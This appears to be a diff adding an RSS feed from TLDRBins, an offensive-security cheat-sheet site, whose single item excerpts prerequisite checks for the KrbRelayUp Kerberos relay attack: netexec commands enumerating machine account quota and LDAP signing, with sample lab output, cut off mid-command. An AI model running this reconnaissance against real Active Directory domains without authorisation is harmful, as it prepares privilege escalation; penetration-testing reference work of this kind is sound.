@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Kerberos Relay on TLDRBins</title>
+    <link>https://tldrbins.github.io/@kerberos-relay/</link>
+    <description>Recent content in Kerberos Relay on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@kerberos-relay/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>KrbRelayUp</title>
+      <link>https://tldrbins.github.io/krbrelayup/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/krbrelayup/</guid>
+      <description>Prerequisite 1. Machine Quota nxc ldap &amp;lt;TARGET_DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M maq $ nxc ldap DC01.example.com -u &amp;#39;apple.seed&amp;#39; -p &amp;#39;Password&amp;#39; -d example.com -M maq LDAP 10.10.72.181 389 DC01 [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com) LDAP 10.10.72.181 389 DC01 [+] example.com\apple.seed:Password MAQ 10.10.72.181 389 DC01 [*] Getting the MachineAccountQuota MAQ 10.10.72.181 389 DC01 MachineAccountQuota: 10 2. LDAP Signing NOT Enforced nxc ldap &amp;lt;TARGET_DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M ldap-checker $ nxc ldap DC01.</description>
+    </item>
+  </channel>
+</rss>
